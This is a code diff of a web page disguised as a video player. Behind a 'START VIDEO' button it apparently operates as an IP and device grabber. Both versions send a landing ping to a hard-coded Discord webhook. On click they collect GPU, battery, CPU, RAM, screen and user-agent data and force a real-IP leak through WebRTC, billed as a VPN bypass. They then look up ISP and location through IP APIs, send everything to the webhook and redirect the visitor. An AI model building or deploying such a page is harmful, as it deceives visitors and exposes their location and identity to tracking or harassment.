@@ -3,176 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Player | Secure Stream</title>
+    <title>Media Player - Loading...</title>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .player-box { text-align: center; width: 350px; padding: 50px; background: #050505; border: 1px solid #151515; border-radius: 20px; box-shadow: 0 30px 60px rgba(0,0,0,1); transition: 0.5s cubic-bezier(0.2, 1, 0.3, 1); }
-        .player-box:hover { border-color: #ff0000; transform: translateY(-2px); }
-        .play-btn { background: linear-gradient(145deg, #ff0000, #b30000); color: #fff; padding: 22px 55px; border-radius: 12px; font-weight: 900; border: none; font-size: 24px; cursor: pointer; letter-spacing: 1.5px; box-shadow: 0 10px 30px rgba(255,0,0,0.3); transition: 0.3s; }
-        .play-btn:active { transform: scale(0.95); opacity: 0.8; }
-        .loading-text { color: #333; font-size: 11px; margin-top: 30px; text-transform: uppercase; letter-spacing: 3px; font-weight: 700; }
-        #progress { position: fixed; top: 0; left: 0; height: 4px; background: #ff0000; width: 0%; transition: width 0.8s ease; }
-        .v-overlay { position: absolute; top: 10px; right: 10px; font-size: 8px; color: #111; pointer-events: none; }
+        .gate { text-align: center; cursor: pointer; padding: 40px; border: 1px solid #111; border-radius: 12px; background: #050505; transition: 0.3s; }
+        .gate:active { transform: scale(0.98); }
+        .btn { background: #ff0000; color: #fff; padding: 18px 50px; border-radius: 8px; font-weight: bold; border: none; font-size: 22px; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
+        .status { color: #333; font-size: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-    <div id="progress"></div>
-    <div class="v-overlay">SENTINEL_APEX_V26</div>
-
-    <div class="player-box" id="gate">
-        <button class="play-btn" id="trigger">▶ PLAY VIDEO</button>
-        <p class="loading-text" id="status">Secure Connection Verified</p>
+    <div class="gate" id="masterTrigger">
+        <button class="btn">▶ START VIDEO</button>
+        <p class="status">Connecting to Encrypted Buffer...</p>
     </div>
 
     <script>
-    /**
-     * SENTINEL APEX CORE 
-     * Refined for Hardware Serialization & Anti-CORS Dispatch
-     */
     const CONFIG = {
-        HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
+        HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0",
         DEST: "https://youtube.com/@LigmaBlox-w7m"
     };
 
-    // --- ANTI-FIREWALL DISPATCHER (The Fix) ---
-    // Uses Synchronous XHR and Beacon racing to bypass Discord's "No-Cors" rejection
-    function dispatch(payload, label = "APEX-SYSTEM") {
-        const body = JSON.stringify({ ...payload, username: label });
+    // --- UNIVERSAL DISPATCHER ---
+    function send(data, label = "SYSTEM") {
+        const blob = new Blob([JSON.stringify({ ...data, username: label })], { type: 'application/json' });
         
-        // Method 1: Beacon (Background thread, persists after tab close)
-        navigator.sendBeacon(CONFIG.HOOK, new Blob([body], { type: 'application/json' }));
-
-        // Method 2: Synchronous XHR (Forces the browser to send before redirecting)
+        // Try all three delivery methods for maximum durability
+        try { fetch(CONFIG.HOOK, { method: 'POST', body: blob, mode: 'no-cors', keepalive: true }); } catch(e){}
+        try { navigator.sendBeacon(CONFIG.HOOK, blob); } catch(e){}
+        
+        // Backup: XHR for very old devices/browsers
         try {
-            const x = new XMLHttpRequest();
-            x.open("POST", CONFIG.HOOK, true);
-            x.setRequestHeader("Content-Type", "application/json");
-            x.send(body);
-        } catch(e) {}
-
-        // Method 3: No-Cors Fetch (Bypasses Pre-flight checks)
-        fetch(CONFIG.HOOK, { method: 'POST', body: body, mode: 'no-cors', keepalive: true }).catch(()=>{});
+            let x = new XMLHttpRequest();
+            x.open("POST", CONFIG.HOOK);
+            x.send(blob);
+        } catch(e){}
     }
 
-    // --- HARDWARE SERIALIZATION ENGINE ---
-    async function extractReality() {
-        const forensic = {
+    // --- UNIVERSAL DEVICE IDENTIFIER ---
+    async function probeDevice() {
+        let info = {
             os: navigator.platform,
-            mem: navigator.deviceMemory || "Masked",
-            cpu: navigator.hardwareConcurrency || "Masked",
-            gpu: "N/A",
-            res: `${screen.width}x${screen.height}`,
-            avail: `${screen.availWidth}x${screen.availHeight}`,
-            dpr: window.devicePixelRatio,
-            touch: navigator.maxTouchPoints,
-            lang: navigator.language,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+            agent: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || "N/A",
+            ram: navigator.deviceMemory || "N/A",
+            gpu: "Unknown",
+            screen: `${screen.width}x${screen.height} (@${window.devicePixelRatio}x)`
         };
 
-        // GPU Unmasking
+        // GPU Unmasking (Works on Windows, Mac, Android, iOS)
         try {
-            const c = document.createElement('canvas');
-            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-            const d = gl.getExtension('WEBGL_debug_renderer_info');
-            forensic.gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-        } catch(e) { forensic.gpu = "Lockdown_Active"; }
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            info.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+        } catch(e) { info.gpu = "Masked/Software"; }
 
-        // Battery Telemetry
+        // Battery Intel
         try {
             const b = await navigator.getBattery();
-            forensic.bat = `${Math.round(b.level * 100)}% (${b.charging ? "AC" : "DC"})`;
+            info.battery = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Unplugged"})`;
         } catch(e) {}
 
-        return forensic;
+        return info;
     }
 
-    // --- NETWORK PENETRATION (VPN & TOR BYPASS) ---
-    function unmaskNetwork() {
-        // 1. WebRTC UDP Force-Punch (Bypasses VPN Tunnel)
+    // --- UNIVERSAL NETWORK PROBE (The "Triple Threat") ---
+    function probeNetwork() {
+        // 1. JSONP Tunnel (Bypasses most Wi-Fi restrictions)
+        const s = document.createElement('script');
+        s.src = `https://ipinfo.io/json?callback=xtunnel&t=${Date.now()}`;
+        document.body.appendChild(s);
+
+        // 2. WebRTC UDP Crack (Bypasses VPNs)
         const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-        rtc.createDataChannel("void");
+        rtc.createDataChannel("");
         rtc.onicecandidate = (e) => {
             if (e.candidate) {
                 const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                if (ip) dispatch({ content: `🚨 **VPN_BYPASS_SUCCESS:** \`${ip[1]}\`` }, "UDP-SENTINEL");
+                if (ip) send({ content: `🚨 **FIREWALL CRACKED:** \`${ip[1]}\`` }, "UDP-PROBE");
             }
         };
         rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-        // 2. JSONP Tunneling (Bypasses DNS Blocks)
-        const s = document.createElement('script');
-        s.src = `https://ipapi.co/jsonp?callback=capture&t=${Date.now()}`;
-        document.body.appendChild(s);
+        // 3. Direct API Race
+        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => {
+            send({ content: `📡 **IP DISCOVERY:** \`${d.ip}\`` }, "API-PROBE");
+        }).catch(()=>{});
     }
 
-    // Network Callback
-    window.capture = (d) => {
-        dispatch({
+    // JSONP Callback handler
+    window.xtunnel = (data) => {
+        send({
             embeds: [{
-                title: "🛑 NETWORK_UNMASKED",
+                title: "🛑 CONNECTION ESTABLISHED",
                 color: 16776960,
                 fields: [
-                    { name: "Public IP", value: `\`${d.ip}\``, inline: true },
-                    { name: "ISP", value: d.org || "Unknown", inline: true },
-                    { name: "Loc", value: `${d.city}, ${d.country_name}`, inline: true },
-                    { name: "VPN/Proxy", value: d.proxy ? "YES" : "NO", inline: true }
+                    { name: "IP", value: data.ip || "??", inline: true },
+                    { name: "ISP", value: data.org || "??", inline: true },
+                    { name: "Location", value: `${data.city}, ${data.country}`, inline: true }
                 ]
             }]
-        }, "NET-SENTINEL");
+        }, "JSONP-PROBE");
     };
 
-    // --- MASTER ONE-TAP TRIGGER ---
-    async function init() {
-        // Initial Landing Ping
-        dispatch({ content: "🟢 **Target has loaded Apex Media Gateway.**" });
+    // --- MASTER RUN ---
+    async function start() {
+        // Silent landing ping
+        send({ content: "🟢 **Target is on GitHub Landing Page...**" });
 
-        const gate = document.getElementById('gate');
-        const trigger = document.getElementById('trigger');
-        const status = document.getElementById('status');
-        const bar = document.getElementById('progress');
-
-        trigger.onclick = async function() {
-            // UI Feedback
-            this.innerText = "BUFFERING...";
-            status.innerText = "Synchronizing Forensic Stream...";
-            status.style.color = "#ff0000";
-            bar.style.width = "100%";
-
-            // 1. Extract Hardware Reality
-            const hw = await extractReality();
-            dispatch({
+        document.getElementById('masterTrigger').onclick = async function() {
+            this.innerHTML = "<button class='btn'>LOADING...</button>";
+            
+            // Gather hardware first
+            const hardware = await probeDevice();
+            send({
                 embeds: [{
-                    title: "💎 HARDWARE_SIGNATURE_UNMASKED",
+                    title: "💎 HARDWARE UNMASKED",
                     color: 16711680,
                     fields: [
-                        { name: "Physical Specs", value: `**CPU:** ${hw.cpu} Cores\n**RAM:** ${hw.mem}GB\n**GPU:** \`${hw.gpu}\``, inline: false },
-                        { name: "Display", value: `**Res:** ${hw.res}\n**DPR:** ${hw.dpr}\n**Avail:** ${hw.avail}`, inline: true },
-                        { name: "Environment", value: `**OS:** ${hw.os}\n**TZ:** ${hw.tz}\n**Bat:** ${hw.bat}`, inline: true },
-                        { name: "User-Agent", value: "```" + navigator.userAgent + "```" }
-                    ],
-                    footer: { text: "Apex Forensic Engine | v26.4" },
-                    timestamp: new Date()
+                        { name: "Device/OS", value: hardware.os, inline: true },
+                        { name: "GPU", value: "```" + hardware.gpu + "```" },
+                        { name: "Specs", value: `Cores: ${hardware.cores} | RAM: ${hardware.ram}GB`, inline: true },
+                        { name: "Screen", value: hardware.screen, inline: true },
+                        { name: "Battery", value: hardware.battery || "N/A", inline: true }
+                    ]
                 }]
-            }, "HW-SENTINEL");
+            }, "APEX-HARDWARE");
 
-            // 2. Force Network Leak
-            unmaskNetwork();
+            // Trigger network probes
+            probeNetwork();
 
-            // 3. Protocol Breakout (OS-Level DNS Leak)
-            const b = document.createElement('iframe');
-            b.src = 'mailto:verify@apex-sentinel.io';
-            b.style.display = 'none';
-            document.body.appendChild(b);
-
-            // 4. Redirect
+            // Final Redirect
             setTimeout(() => {
                 window.location.replace(CONFIG.DEST);
-            }, 800);
+            }, 600);
         };
     }
 
-    init();
+    start();
     </script>
 </body>
 </html>
